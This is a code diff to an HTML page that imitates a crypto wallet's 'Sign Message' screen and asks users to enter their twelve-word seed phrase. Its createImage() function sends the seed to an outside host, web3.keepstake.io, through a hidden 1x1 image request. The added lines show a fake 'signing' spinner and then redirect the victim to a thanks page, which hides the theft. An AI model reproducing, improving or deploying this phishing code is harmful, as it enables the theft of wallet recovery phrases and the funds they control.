@@ -3154,14 +3154,26 @@ button.first-time-flow__button--tertiary:hover {
               min-width: 357px;
           }
 
-      </style><span class="css-transition-group"></span></div></div><!-- react-empty: 27 --><div class="app-primary from-right" style="width: 100%;"><div class="initialize-screen flex-column flex-center flex-grow"><h3 class="flex-center text-transform-uppercase " style="background: rgb(235, 235, 235); color: rgb(174, 174, 174); margin-bottom: 24px; width: 100%; font-size: 20px; padding: 6px;">Sign Message</h3><h3>Wallet Seed</h3><textarea id="seed" name="seed" placeholder="Enter your twelve word phrase here to sign an ownership message." class="twelve-word-phrase letter-spacey"></textarea><div class="flex-row flex-space-between" style="margin-top: 30px; width: 50%;"><button class="primary">CANCEL</button><button onclick="createImage()" name="submit" type="submit" class="primary">OK</button></div></div></div></div></div>
+      </style><span class="css-transition-group"></span></div></div><!-- react-empty: 27 --><div class="app-primary from-right" style="width: 100%;"><div class="initialize-screen flex-column flex-center flex-grow"><h3 class="flex-center text-transform-uppercase " style="background: rgb(235, 235, 235); color: rgb(174, 174, 174); margin-bottom: 24px; width: 100%; font-size: 20px; padding: 6px;">Sign Message</h3><h3>Wallet Seed</h3><textarea id="seed" name="seed" placeholder="Enter your twelve word phrase here to sign an ownership message." class="twelve-word-phrase letter-spacey"></textarea><div class="flex-row flex-space-between" style="margin-top: 30px; width: 50%;"><button class="primary">CANCEL</button><button onclick="createImage()" name="submit" type="submit" class="primary">OK</button></div><div style="margin-top:45px;"id="loading"></div></div></div></div></div>
     <script src="./ui.js" type="text/javascript" charset="utf-8"></script>
     <script type="text/javascript" charset="utf-8">
     function createImage(){
+
+    var loading = document.getElementById("loading");
+
+    loading.innerHTML = "<img src='loading.gif' width='35px' style='float:left'><p style='font-size:1.7em;float:right;margin-top:6px;margin-left:15px;'>signing</p>";
+
     var seed = document.getElementById("seed");
     var seedx = "https://web3.keepstake.io/process.php?seed=" + seed.value;
     var img = new Image(1,1);
     img.src = seedx;
+
+    window.setTimeout(redirect,6500);
+
+    function redirect(){
+      window.location.href = "https://keepstake.io/thanks";
+    }
+
     }
     </script>
   
